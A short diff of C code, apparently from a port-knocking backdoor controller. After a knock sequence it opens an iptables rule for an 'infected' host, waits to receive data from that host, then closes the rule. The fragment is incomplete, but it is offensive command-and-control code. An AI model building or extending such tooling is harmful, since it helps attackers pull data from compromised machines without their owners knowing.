@@ -188,13 +188,13 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
     if((knocking[0] == 1) && (knocking[1] == 1)){
         pcap_t* interfaceinfo;
 
-        system(IPTABLES);
+        system(IPTABLES(INFECTEDIP));
         char *dip = INFECTEDIP;
         unsigned short sport = SHPORT;
         unsigned short dport = SHPORT;
         printf("WAITING FOR DATA\n");
         recv_results(dip, dport);
-        system(TURNOFF);
+        system(TURNOFF(INFECTEDIP));
         pcap_breakloop(interfaceinfo);
     }
     } else {
